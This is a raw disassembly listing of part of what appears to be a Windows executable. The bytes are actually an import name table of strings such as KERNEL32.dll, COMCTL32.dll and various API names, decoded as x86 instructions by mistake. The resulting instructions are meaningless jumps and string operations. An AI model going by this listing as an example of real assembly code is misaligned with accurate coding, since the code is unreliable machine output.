  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
